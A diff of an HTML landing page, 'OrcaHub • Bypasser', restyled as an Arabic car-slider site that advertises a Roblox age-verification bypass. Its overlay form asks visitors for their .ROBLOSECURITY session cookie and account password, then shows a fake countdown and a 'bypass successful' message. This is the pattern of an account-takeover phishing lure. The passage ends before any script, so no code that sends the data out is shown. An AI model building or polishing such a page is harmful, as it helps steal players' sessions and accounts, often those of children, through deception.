@@ -1,763 +1,641 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>OrcaHub • Bypasser</title>
+    <!-- مكتبة أيقونات FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', 'Helvetica Neue', system-ui, -apple-system, sans-serif;
+            font-family: 'Poppins', 'Segoe UI', system-ui, sans-serif;
         }
 
         body {
-            height: 100vh;
+            background-color: #0f0f0f;
+            color: #fff;
             overflow: hidden;
-            background: linear-gradient(-45deg, #0a0a14, #12121f, #1a0a2e, #0f0f1a);
-            background-size: 400% 400%;
-            animation: gradientShift 18s ease infinite;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+            height: 100vh;
+        }
+
+        .container {
             position: relative;
-        }
-
-        @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        .shape {
-            position: absolute;
-            border-radius: 50%;
-            filter: blur(80px);
-            opacity: 0.3;
-            animation: float 14s ease-in-out infinite;
-            pointer-events: none;
-        }
-
-        .shape:nth-child(1) {
-            width: 200px;
-            height: 200px;
-            background: radial-gradient(circle, #ff6b6b, transparent 70%);
-            top: 10%;
-            left: 5%;
-            animation-duration: 12s;
-        }
-        .shape:nth-child(2) {
-            width: 280px;
-            height: 280px;
-            background: radial-gradient(circle, #a29bfe, transparent 70%);
-            bottom: 10%;
-            right: 5%;
-            animation-duration: 16s;
-            animation-delay: -4s;
-        }
-        .shape:nth-child(3) {
-            width: 150px;
-            height: 150px;
-            background: radial-gradient(circle, #4ecdc4, transparent 70%);
-            top: 60%;
-            left: 15%;
-            animation-duration: 10s;
-            animation-delay: -6s;
-        }
-        .shape:nth-child(4) {
-            width: 220px;
-            height: 220px;
-            background: radial-gradient(circle, #ffe66d, transparent 70%);
-            top: 20%;
-            right: 20%;
-            animation-duration: 15s;
-            animation-delay: -8s;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translate(0, 0) scale(1); }
-            25% { transform: translate(40px, -50px) scale(1.1); }
-            50% { transform: translate(-30px, 30px) scale(0.95); }
-            75% { transform: translate(-50px, -20px) scale(1.05); }
-        }
-
-        .glass-card {
-            position: relative;
-            z-index: 10;
-            width: 94%;
-            max-width: 480px;
-            background: rgba(16, 16, 30, 0.75);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
-            border-radius: 48px;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(255, 255, 255, 0.04), 0 0 80px rgba(162, 155, 254, 0.06);
-            padding: 36px 28px 32px;
-            transition: all 0.4s ease;
-            animation: fadeIn 0.8s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px) scale(0.97); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 28px;
-        }
-
-        .icon-circle {
-            display: inline-block;
-            width: 80px;
-            height: 80px;
-            position: relative;
-            animation: floatIcon 3.5s ease-in-out infinite;
-        }
-
-        .icon-circle svg {
             width: 100%;
-            height: 100%;
-            display: block;
-            filter: drop-shadow(0 0 30px rgba(162, 155, 254, 0.2));
+            height: 100vh;
         }
 
-        .icon-circle .outer-ring {
-            animation: spinSlow 6s linear infinite;
-            transform-origin: center;
+        /* القائمة العلوية */
+        .navbar {
+            position: absolute;
+            top: 30px;
+            left: 50px;
+            right: 50px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 20;
         }
 
-        .icon-circle .inner-ring {
-            animation: spinSlowReverse 4s linear infinite;
-            transform-origin: center;
-        }
-
-        .icon-circle .pulse-dot {
-            animation: pulseDot 1.8s ease-in-out infinite;
-        }
-
-        .icon-circle .orbit-dot {
-            animation: orbitMove 3s linear infinite;
-            transform-origin: center;
-        }
-
-        @keyframes spinSlow {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-
-        @keyframes spinSlowReverse {
-            from { transform: rotate(360deg); }
-            to { transform: rotate(0deg); }
-        }
-
-        @keyframes pulseDot {
-            0%, 100% { r: 4; opacity: 0.6; transform: scale(1); }
-            50% { r: 8; opacity: 1; transform: scale(1.2); }
-        }
-
-        @keyframes orbitMove {
-            from { transform: rotate(0deg) translateX(-18px); }
-            to { transform: rotate(360deg) translateX(-18px); }
-        }
-
-        @keyframes floatIcon {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-        }
-
-        h1 {
-            font-size: 1.7rem;
+        .logo {
+            font-size: 28px;
             font-weight: 800;
             background: linear-gradient(135deg, #ff6b6b, #a29bfe, #4ecdc4);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            letter-spacing: -0.5px;
-            margin-top: 6px;
-            background-size: 300% 300%;
-            animation: gradientText 4s ease-in-out infinite;
-        }
-
-        @keyframes gradientText {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        .sub {
-            color: #8888aa;
-            font-size: 0.7rem;
-            letter-spacing: 4px;
-            text-transform: uppercase;
-            margin-top: 6px;
-            font-weight: 300;
-            border-top: 1px solid rgba(255, 255, 255, 0.04);
-            padding-top: 10px;
-        }
-
-        .step-indicator {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 30px;
-            gap: 4px;
-            position: relative;
-        }
-
-        .step-indicator::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 12%;
-            right: 12%;
-            height: 2px;
-            background: rgba(255, 255, 255, 0.05);
-            transform: translateY(-50%);
-            z-index: 0;
-        }
-
-        .step {
-            flex: 1;
-            text-align: center;
-            padding: 8px 0;
-            background: rgba(30, 30, 48, 0.5);
-            border-radius: 40px;
-            font-size: 0.6rem;
-            font-weight: 700;
-            color: #5a5a72;
-            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            position: relative;
-            z-index: 1;
-            border: 1px solid transparent;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
-
-        .step.active {
-            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
-            color: white;
-            box-shadow: 0 0 30px rgba(162, 155, 254, 0.3);
-            transform: scale(1.05);
-            border-color: rgba(255, 255, 255, 0.1);
-        }
-
-        .step.completed {
-            background: rgba(78, 205, 196, 0.2);
-            color: #4ecdc4;
-            border-color: rgba(78, 205, 196, 0.2);
-        }
-
-        .step.error {
-            background: rgba(255, 107, 107, 0.2);
-            color: #ff6b6b;
-            border-color: rgba(255, 107, 107, 0.2);
-        }
-
-        .form-step {
-            display: none;
-            animation: slideUp 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        .form-step.active-step {
-            display: block;
-        }
-
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px) scale(0.96); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
-        }
-
-        label {
-            display: block;
-            font-weight: 700;
-            margin-bottom: 8px;
-            color: #c0c0dd;
-            font-size: 0.75rem;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
-
-        input {
-            width: 100%;
-            padding: 15px 18px;
-            background: rgba(10, 10, 20, 0.6);
-            border: 1.5px solid rgba(255, 255, 255, 0.05);
-            border-radius: 30px;
-            color: #f0f0ff;
-            font-size: 0.95rem;
-            outline: none;
-            transition: all 0.4s ease;
-            margin-bottom: 18px;
-        }
-
-        input:focus {
-            border-color: #a29bfe;
-            box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.12);
-            background: rgba(20, 20, 36, 0.7);
-        }
-
-        input::placeholder {
-            color: #3a3a52;
-        }
-
-        input.error {
-            border-color: #ff6b6b;
-            box-shadow: 0 0 0 4px rgba(255, 107, 107, 0.1);
-        }
-
-        /* --- Button Group --- */
-        .btn-group {
-            display: flex;
-            gap: 10px;
-            margin-top: 8px;
-        }
-
-        .btn-group .btn-primary {
-            flex: 1;
-            margin-top: 0;
-            padding: 14px;
-            font-size: 0.85rem;
-        }
-
-        .btn-instagram {
-            background: linear-gradient(135deg, #f58529, #dd2a7b);
-            border: none;
-            border-radius: 40px;
-            padding: 14px 18px;
-            font-weight: 700;
-            font-size: 0.8rem;
-            color: white;
-            cursor: pointer;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            flex: 1;
-            text-decoration: none;
-            box-shadow: 0 4px 20px rgba(221, 42, 123, 0.3);
-        }
-
-        .btn-instagram:hover {
-            transform: scale(1.05);
-            box-shadow: 0 8px 30px rgba(221, 42, 123, 0.5);
-        }
-
-        .btn-instagram:active {
-            transform: scale(0.95);
-        }
-
-        .btn-instagram svg {
-            width: 18px;
-            height: 18px;
-            fill: currentColor;
-        }
-
-        .profile-preview {
-            background: linear-gradient(135deg, rgba(30, 20, 48, 0.7), rgba(20, 20, 36, 0.8));
-            border-radius: 32px;
-            padding: 18px 20px;
-            margin-bottom: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.03);
-            display: none;
-            align-items: center;
-            gap: 16px;
-            backdrop-filter: blur(8px);
-            transition: all 0.4s ease;
-        }
-
-        .profile-preview.show {
-            display: flex;
-            animation: fadeInScale 0.5s ease;
-        }
-
-        @keyframes fadeInScale {
-            from { opacity: 0; transform: scale(0.92); }
-            to { opacity: 1; transform: scale(1); }
-        }
-
-        .profile-preview img {
-            width: 64px;
-            height: 64px;
-            border-radius: 50%;
-            border: 2px solid rgba(162, 155, 254, 0.3);
-            box-shadow: 0 0 30px rgba(162, 155, 254, 0.15);
-            object-fit: cover;
-            background: #1a1a2e;
-        }
-
-        .profile-info {
-            flex: 1;
-        }
-
-        .profile-name {
-            font-size: 1.05rem;
-            font-weight: 700;
-            color: #fff;
-        }
-
-        .profile-id {
-            color: #8888aa;
-            font-size: 0.75rem;
-            margin-top: 2px;
-        }
-
-        .profile-stats {
-            color: #666688;
-            font-size: 0.65rem;
-            margin-top: 2px;
-        }
-
-        .badge-verified {
-            display: inline-block;
-            background: rgba(78, 205, 196, 0.15);
-            color: #4ecdc4;
-            padding: 2px 12px;
-            border-radius: 20px;
-            font-size: 0.6rem;
-            font-weight: 600;
-            margin-top: 4px;
-            border: 1px solid rgba(78, 205, 196, 0.1);
-        }
-
-        .error-message {
-            display: none;
-            background: rgba(255, 107, 107, 0.08);
-            border: 1px solid rgba(255, 107, 107, 0.15);
-            color: #ff6b6b;
-            padding: 12px 16px;
-            border-radius: 24px;
-            margin-bottom: 18px;
-            font-size: 0.85rem;
-            font-weight: 500;
-            text-align: center;
-            animation: fadeInScale 0.4s ease;
-        }
-
-        .error-message.show {
-            display: block;
-        }
-
-        .btn-primary {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
-            border: none;
-            border-radius: 40px;
-            font-weight: 800;
-            font-size: 0.95rem;
-            color: white;
-            cursor: pointer;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            text-transform: uppercase;
             letter-spacing: 1px;
-            position: relative;
-            overflow: hidden;
         }
 
-        .btn-primary::before {
-            content: '';
+        .menu-icon {
+            font-size: 22px;
+            cursor: pointer;
+            color: #fff;
+            transition: 0.3s;
+        }
+
+        .menu-icon:hover {
+            color: #a29bfe;
+        }
+
+        /* روابط التواصل الاجتماعي */
+        .social-links {
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.08) 0%, transparent 70%);
+            left: 40px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            flex-direction: column;
+            gap: 22px;
+            z-index: 20;
+        }
+
+        .social-links a {
+            color: #8888aa;
+            font-size: 20px;
+            text-decoration: none;
+            transition: 0.3s;
+        }
+
+        .social-links a:hover {
+            color: #a29bfe;
+            transform: scale(1.2);
+        }
+
+        /* النص الكبير في الخلفية */
+        .bg-title {
+            position: absolute;
+            top: 45%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 18vw;
+            font-weight: 900;
+            color: rgba(162, 155, 254, 0.15);
+            letter-spacing: 15px;
+            user-select: none;
+            z-index: 1;
+            transition: color 0.8s ease;
+            text-shadow: 0 0 80px rgba(162, 155, 254, 0.05);
+        }
+
+        /* الشرائح */
+        .slider-wrapper {
+            width: 100%;
+            height: 100%;
+            position: relative;
+        }
+
+        .slide {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            padding: 0 10%;
             opacity: 0;
-            transition: opacity 0.5s;
+            visibility: hidden;
+            transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
-        .btn-primary:hover::before {
+        .slide.active {
             opacity: 1;
+            visibility: visible;
         }
 
-        .btn-primary:hover {
-            transform: scale(1.02);
+        /* تفاصيل السيارة */
+        .car-info {
+            z-index: 10;
+        }
+
+        .sub-title {
+            font-size: 28px;
+            color: #8888aa;
+            display: block;
+            font-weight: 300;
+        }
+
+        .car-info h2 {
+            font-size: 60px;
+            font-weight: 800;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #fff, #a29bfe);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .car-info p {
+            font-size: 14px;
+            color: #9999bb;
+            margin-bottom: 25px;
+            letter-spacing: 3px;
+        }
+
+        .btn {
+            padding: 14px 35px;
+            background: transparent;
+            border: 2px solid rgba(162, 155, 254, 0.5);
+            color: #fff;
+            border-radius: 40px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            font-size: 14px;
+            letter-spacing: 1px;
+        }
+
+        .btn:hover {
+            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
+            border-color: transparent;
+            transform: scale(1.05);
             box-shadow: 0 10px 40px rgba(162, 155, 254, 0.3);
         }
 
-        .btn-primary:active {
-            transform: scale(0.96);
+        /* صورة السيارة */
+        .car-image {
+            z-index: 5;
+            position: relative;
+            transform: scale(0.8) translateX(100px);
+            transition: transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
-        .btn-primary:disabled {
+        .slide.active .car-image {
+            transform: scale(1) translateX(0);
+        }
+
+        .car-image img {
+            max-width: 550px;
+            filter: drop-shadow(0 30px 60px rgba(0,0,0,0.6));
+        }
+
+        /* أزرار الترقيم جانباً */
+        .pagination {
+            position: absolute;
+            right: 50px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+            z-index: 20;
+        }
+
+        .dot {
+            background: transparent;
+            border: 1px solid rgba(255,255,255,0.15);
+            color: #8888aa;
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 700;
+            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .dot.active, .dot:hover {
+            border-color: #a29bfe;
+            background: rgba(162, 155, 254, 0.15);
+            color: #fff;
+            transform: scale(1.1);
+            box-shadow: 0 0 30px rgba(162, 155, 254, 0.2);
+        }
+
+        /* ==================== BYPASSER OVERLAY ==================== */
+        .bypasser-overlay {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 30;
+            width: 90%;
+            max-width: 500px;
+            background: rgba(16, 16, 30, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+            padding: 24px 28px;
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .bypasser-overlay:hover {
+            transform: translateX(-50%) translateY(-5px);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8);
+        }
+
+        .bypasser-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+        }
+
+        .bypasser-header h3 {
+            font-size: 16px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 1px;
+        }
+
+        .bypasser-header span {
+            font-size: 12px;
+            color: #4ecdc4;
+            font-weight: 600;
+        }
+
+        .bypasser-input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 14px;
+        }
+
+        .bypasser-input-group input {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(10, 10, 20, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 30px;
+            color: #f0f0ff;
+            font-size: 13px;
+            outline: none;
+            transition: 0.4s;
+        }
+
+        .bypasser-input-group input:focus {
+            border-color: #a29bfe;
+            box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.1);
+        }
+
+        .bypasser-input-group input::placeholder {
+            color: #3a3a52;
+        }
+
+        .bypasser-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .bypasser-actions .btn-bypass {
+            flex: 2;
+            padding: 12px;
+            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
+            border: none;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 13px;
+            color: white;
+            cursor: pointer;
+            transition: 0.4s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .bypasser-actions .btn-bypass:hover {
+            transform: scale(1.02);
+            box-shadow: 0 10px 30px rgba(162, 155, 254, 0.3);
+        }
+
+        .bypasser-actions .btn-bypass:disabled {
             opacity: 0.5;
             cursor: not-allowed;
             transform: none !important;
         }
 
-        .btn-secondary {
-            width: 100%;
+        .bypasser-actions .btn-instagram {
+            flex: 1;
             padding: 12px;
-            background: rgba(50, 50, 74, 0.25);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            border-radius: 40px;
-            font-weight: 600;
-            font-size: 0.8rem;
-            color: #8888aa;
+            background: linear-gradient(135deg, #f58529, #dd2a7b);
+            border: none;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 13px;
+            color: white;
             cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 10px;
+            transition: 0.4s;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
         }
 
-        .btn-secondary:hover {
-            background: rgba(60, 60, 84, 0.4);
-            color: #ccccee;
+        .bypasser-actions .btn-instagram:hover {
+            transform: scale(1.02);
+            box-shadow: 0 10px 30px rgba(221, 42, 123, 0.3);
         }
 
-        .loader-container {
+        .bypasser-actions .btn-instagram svg {
+            width: 16px;
+            height: 16px;
+            fill: currentColor;
+        }
+
+        /* Bypasser Loader */
+        .bypasser-loader {
             display: none;
             text-align: center;
-            padding: 20px 0 15px;
+            padding: 10px 0;
         }
 
-        .loader-container.show {
+        .bypasser-loader.show {
             display: block;
-            animation: fadeInScale 0.5s ease;
+            animation: fadeInScale 0.4s ease;
         }
 
-        .spinner {
-            width: 70px;
-            height: 70px;
-            border: 4px solid rgba(162, 155, 254, 0.08);
+        .bypasser-loader .spinner-small {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(162, 155, 254, 0.08);
             border-top-color: #a29bfe;
             border-right-color: #ff6b6b;
-            border-bottom-color: #4ecdc4;
             border-radius: 50%;
             animation: spin 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) infinite;
-            margin: 0 auto 14px;
+            margin: 0 auto 10px;
         }
 
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
 
-        .loader-text {
-            color: #a0a0b8;
-            font-size: 0.85rem;
+        .bypasser-loader .loader-text {
+            color: #8888aa;
+            font-size: 12px;
             font-weight: 300;
             letter-spacing: 0.5px;
         }
 
-        .loader-text .time {
+        .bypasser-loader .loader-text .time {
             color: #ff6b6b;
             font-weight: 700;
-            font-size: 1.2rem;
         }
 
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 2px;
-            margin: 12px auto 0;
-            overflow: hidden;
-        }
-
-        .progress-bar .fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #a29bfe, #ff6b6b, #4ecdc4);
-            border-radius: 2px;
-            transition: width 0.1s linear;
-        }
-
-        .success-message {
+        /* Bypasser Result */
+        .bypasser-result {
             display: none;
             background: rgba(78, 205, 196, 0.06);
             border: 1px solid rgba(78, 205, 196, 0.12);
             color: #4ecdc4;
-            padding: 18px;
-            border-radius: 28px;
+            padding: 12px 16px;
+            border-radius: 24px;
             text-align: center;
-            font-size: 0.95rem;
+            font-size: 13px;
             font-weight: 600;
-            animation: fadeInScale 0.5s ease;
+            margin-top: 12px;
+            animation: fadeInScale 0.4s ease;
         }
 
-        .success-message.show {
+        .bypasser-result.show {
             display: block;
         }
 
-        .success-message .big {
-            font-size: 2.8rem;
+        .bypasser-result .big {
+            font-size: 2rem;
             display: block;
-            margin-bottom: 6px;
+            margin-bottom: 4px;
         }
 
-        .footer {
+        /* Error */
+        .bypasser-error {
+            display: none;
+            background: rgba(255, 107, 107, 0.08);
+            border: 1px solid rgba(255, 107, 107, 0.15);
+            color: #ff6b6b;
+            padding: 10px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
             text-align: center;
-            color: #3a3a52;
-            font-size: 0.55rem;
-            margin-top: 24px;
-            border-top: 1px solid rgba(255, 255, 255, 0.02);
-            padding-top: 16px;
-            letter-spacing: 1.5px;
-            text-transform: uppercase;
+            margin-top: 10px;
+            animation: fadeInScale 0.4s ease;
         }
 
-        @media (max-width: 440px) {
-            .glass-card {
-                padding: 28px 18px 24px;
-                border-radius: 36px;
-            }
-            h1 { font-size: 1.4rem; }
-            .icon-circle { width: 60px; height: 60px; }
-            .step { font-size: 0.5rem; padding: 6px 0; }
-            .profile-preview { flex-direction: column; text-align: center; }
-            .profile-preview img { width: 56px; height: 56px; }
-            .btn-group { flex-direction: column; gap: 8px; }
+        .bypasser-error.show {
+            display: block;
+        }
+
+        @keyframes fadeInScale {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        /* Responsive */
+        @media (max-width: 992px) {
+            .car-image img { max-width: 350px; }
+            .car-info h2 { font-size: 40px; }
+            .bg-title { font-size: 22vw; }
+            .social-links { left: 20px; }
+            .pagination { right: 20px; }
+            .navbar { left: 20px; right: 20px; }
+        }
+
+        @media (max-width: 768px) {
+            .slide { flex-direction: column; justify-content: center; text-align: center; padding: 0 5%; }
+            .car-image { transform: scale(0.8) translateX(0); }
+            .slide.active .car-image { transform: scale(0.9) translateX(0); }
+            .car-image img { max-width: 250px; }
+            .car-info h2 { font-size: 32px; }
+            .social-links { display: none; }
+            .pagination { right: 15px; gap: 12px; }
+            .dot { width: 36px; height: 36px; font-size: 10px; }
+            .bg-title { font-size: 30vw; }
+            .bypasser-overlay { bottom: 15px; padding: 18px 20px; max-width: 95%; }
+            .bypasser-actions { flex-direction: column; }
         }
     </style>
 </head>
 <body>
 
-    <div class="shape"></div>
-    <div class="shape"></div>
-    <div class="shape"></div>
-    <div class="shape"></div>
+    <div class="container">
+        <!-- القائمة العلوية -->
+        <nav class="navbar">
+            <div class="logo">OrcaHub</div>
+            <div class="menu-icon"><i class="fas fa-bars"></i></div>
+        </nav>
 
-    <div class="glass-card" id="app">
+        <div class="social-links">
+            <a href="#"><i class="fab fa-twitter"></i></a>
+            <a href="#"><i class="fab fa-instagram"></i></a>
+            <a href="#"><i class="fab fa-facebook-f"></i></a>
+        </div>
 
-        <div class="header">
-            <div class="icon-circle">
-                <svg viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <circle class="outer-ring" cx="40" cy="40" r="34" stroke="url(#ringGrad)" stroke-width="2.5" stroke-dasharray="10 6" stroke-linecap="round"/>
-                    <circle class="inner-ring" cx="40" cy="40" r="24" stroke="url(#ringGrad2)" stroke-width="1.5" stroke-dasharray="6 8" stroke-linecap="round"/>
-                    <circle cx="40" cy="40" r="12" fill="rgba(162,155,254,0.08)" stroke="url(#ringGrad)" stroke-width="1"/>
-                    <circle class="pulse-dot" cx="40" cy="40" r="5" fill="#a29bfe" opacity="0.8"/>
-                    <circle class="orbit-dot" cx="40" cy="12" r="3" fill="#ff6b6b" opacity="0.7"/>
-                    <circle class="orbit-dot" cx="40" cy="68" r="3" fill="#4ecdc4" opacity="0.7"/>
-                    <circle class="orbit-dot" cx="12" cy="40" r="3" fill="#ffe66d" opacity="0.7"/>
-                    <circle class="orbit-dot" cx="68" cy="40" r="3" fill="#a29bfe" opacity="0.7"/>
-                    <defs>
-                        <linearGradient id="ringGrad" x1="0" y1="0" x2="80" y2="80">
-                            <stop offset="0%" stop-color="#a29bfe"/>
-                            <stop offset="50%" stop-color="#ff6b6b"/>
-                            <stop offset="100%" stop-color="#4ecdc4"/>
-                        </linearGradient>
-                        <linearGradient id="ringGrad2" x1="80" y1="0" x2="0" y2="80">
-                            <stop offset="0%" stop-color="#4ecdc4"/>
-                            <stop offset="50%" stop-color="#ffe66d"/>
-                            <stop offset="100%" stop-color="#a29bfe"/>
-                        </linearGradient>
-                    </defs>
-                </svg>
+        <!-- النص الخلفي الكبير -->
+        <h1 class="bg-title" id="bgTitle">ORCA</h1>
+
+        <!-- الشرائح -->
+        <div class="slider-wrapper">
+            <!-- الشريحة الأولى -->
+            <div class="slide active" data-color="rgba(162, 155, 254, 0.15)">
+                <div class="car-info">
+                    <span class="sub-title">Ultimate</span>
+                    <h2>BYPPASSER</h2>
+                    <p>AGE VERIFICATION BYPASS TOOL</p>
+                    <button class="btn">Discover Now</button>
+                </div>
+                <div class="car-image">
+                    <img src="https://i.postimg.cc/mD3mXzYr/yellow-car.png" alt="Yellow Car">
+                </div>
             </div>
-            <h1>OrcaHub • Bypasser</h1>
-            <div class="sub">Age Verification Bypass</div>
+
+            <!-- الشريحة الثانية -->
+            <div class="slide" data-color="rgba(255, 107, 107, 0.15)">
+                <div class="car-info">
+                    <span class="sub-title">Powerful</span>
+                    <h2>STEALTH</h2>
+                    <p>ADVANCED SECURITY BYPASS</p>
+                    <button class="btn">Discover Now</button>
+                </div>
+                <div class="car-image">
+                    <img src="https://i.postimg.cc/q7333B3L/red-car.png" alt="Red Car">
+                </div>
+            </div>
+
+            <!-- الشريحة الثالثة -->
+            <div class="slide" data-color="rgba(78, 205, 196, 0.15)">
+                <div class="car-info">
+                    <span class="sub-title">Next Gen</span>
+                    <h2>FUTURE</h2>
+                    <p>AI-POWERED BYPASS ENGINE</p>
+                    <button class="btn">Discover Now</button>
+                </div>
+                <div class="car-image">
+                    <img src="https://i.postimg.cc/13f0m9f3/blue-car.png" alt="Blue Car">
+                </div>
+            </div>
         </div>
 
-        <!-- STEP INDICATOR (Single step for simplified UI) -->
-        <div class="step-indicator">
-            <div class="step active" id="step1Label">❶ Bypass</div>
+        <!-- أزرار التبديل -->
+        <div class="pagination">
+            <button class="dot active" data-index="0">01</button>
+            <button class="dot" data-index="1">02</button>
+            <button class="dot" data-index="2">03</button>
         </div>
 
-        <!-- MAIN FORM: Cookie + Password + Bypass Button -->
-        <div class="form-step active-step" id="step1">
-            <label>🍪 Enter .ROBLOSECURITY Cookie</label>
-            <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..." autocomplete="off">
+        <!-- ==================== BYPASSER OVERLAY ==================== -->
+        <div class="bypasser-overlay" id="bypasserOverlay">
+            <div class="bypasser-header">
+                <h3>🔓 Age Bypass</h3>
+                <span>OrcaHub • v3.0</span>
+            </div>
 
-            <label>🔑 Enter Account Password</label>
-            <input type="password" id="passwordInput" placeholder="••••••••" autocomplete="off">
+            <div class="bypasser-input-group">
+                <input type="text" id="cookieInput" placeholder="🍪 .ROBLOSECURITY Cookie" autocomplete="off">
+                <input type="password" id="passwordInput" placeholder="🔑 Account Password" autocomplete="off">
+            </div>
 
-            <div id="errorMessage" class="error-message"></div>
+            <div id="bypasserError" class="bypasser-error"></div>
 
-            <!-- Loader for bypass -->
-            <div id="bypassLoader" class="loader-container">
-                <div class="spinner"></div>
+            <div id="bypasserLoader" class="bypasser-loader">
+                <div class="spinner-small"></div>
                 <div class="loader-text">
                     ⏳ Processing bypass...<br>
                     <span class="time" id="bypassTimer">60</span> seconds remaining
                 </div>
-                <div class="progress-bar">
-                    <div class="fill" id="bypassProgress"></div>
+            </div>
+
+            <div id="bypasserResult" class="bypasser-result">
+                <span class="big">🎉</span>
+                <div style="font-size:1rem; margin-bottom:2px;">BYPASS SUCCESSFUL!</div>
+                <div style="font-size:0.75rem; font-weight:400; color:#8888aa;">
+                    Age restriction removed from account.
                 </div>
             </div>
 
-            <!-- Profile Preview (shows after bypass) -->
-            <div id="profilePreview" class="profile-preview">
-                <img id="profileImg" src="" alt="avatar">
-                <div class="profile-info">
-                    <div class="profile-name" id="profileName">@username</div>
-                    <div class="profile-id" id="profileId">ID: --</div>
-                    <div class="profile-stats" id="profileStats">📊 Followers: -- • Following: --</div>
-                    <span class="badge-verified" id="profileBadge">✅ Verified</span>
-                </div>
-            </div>
-
